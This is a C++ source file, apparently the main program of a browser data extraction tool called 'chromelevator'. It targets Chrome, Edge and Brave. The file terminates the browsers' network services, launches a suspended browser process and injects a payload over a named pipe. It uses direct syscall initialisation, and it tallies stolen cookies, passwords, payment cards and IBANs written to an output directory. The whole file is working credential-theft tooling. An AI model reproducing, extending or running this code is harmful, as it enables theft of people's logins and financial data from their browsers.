// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "process_manager.hpp"
#include "pipe_server.hpp"
#include "injector.hpp"
#include <iostream>

using namespace Injector;

struct GlobalStats {
    int successful = 0;
    int failed = 0;
};

void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
                    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
    
    console.BrowserHeader(browser.displayName);

    try {
        console.Debug("Terminating browser network services...");
        ProcessManager::KillNetworkServices(browser.exeName);
        console.Debug("  [+] Network services terminated");

        console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
        ProcessManager procMgr(browser);
        procMgr.CreateSuspended();
        console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");

        PipeServer pipe(browser.type);
        pipe.Create();
        console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipe.GetName()));

        PayloadInjector injector(procMgr, console);
        injector.Inject(pipe.GetName());

        console.Debug("Awaiting payload connection...");
        pipe.WaitForClient();
        console.Debug("  [+] Payload connected");
        
        pipe.SendConfig(verbose, fingerprint, output);
        pipe.ProcessMessages(verbose);
        
        auto pStats = pipe.GetStats();
        if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0) {
            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans,
                           pStats.profiles, (output / browser.displayName).string());
            stats.successful++;
        } else {
            console.Warn("No data extracted");
            stats.failed++;
        }
        
        procMgr.Terminate();

    } catch (const std::exception& e) {
        console.Error(std::string(e.what()));
        stats.failed++;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    bool verbose = false;
    bool fingerprint = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    Core::Console console(false);

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
        else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc) output = argv[++i];
        else if (arg == L"--help" || arg == L"-h") {
            console.Banner();
            std::wcout << L"\n  Usage: chromelevator.exe [options] <chrome|edge|brave|all>\n\n";
            std::wcout << L"  Options:\n";
            std::wcout << L"    -v, --verbose      Show detailed output\n";
            std::wcout << L"    -f, --fingerprint  Extract browser fingerprint\n";
            std::wcout << L"    -o, --output-path  Custom output directory\n";
            return 0;
        }
        else if (targetType.empty() && arg[0] != L'-') targetType = arg;
    }

    Core::Console mainConsole(verbose);
    mainConsole.Banner();

    if (targetType.empty()) {
        mainConsole.Error("No target specified. Use: chrome, edge, brave, or all");
        return 1;
    }

    if (!Sys::InitApi(verbose)) {
        mainConsole.Error("Syscall initialization failed");
        return 1;
    }

    std::filesystem::create_directories(output);

    GlobalStats stats;

    if (targetType == L"all") {
        auto browsers = BrowserDiscovery::FindAll();
        if (browsers.empty()) {
            mainConsole.Warn("No supported browsers found");
            return 0;
        }
        for (const auto& browser : browsers) {
            ProcessBrowser(browser, verbose, fingerprint, output, mainConsole, stats);
        }
    } else {
        auto browser = BrowserDiscovery::FindSpecific(targetType);
        if (!browser) {
            mainConsole.Error("Browser not found: " + Core::ToUtf8(targetType));
            return 1;
        }
        ProcessBrowser(*browser, verbose, fingerprint, output, mainConsole, stats);
    }

    return 0;
}
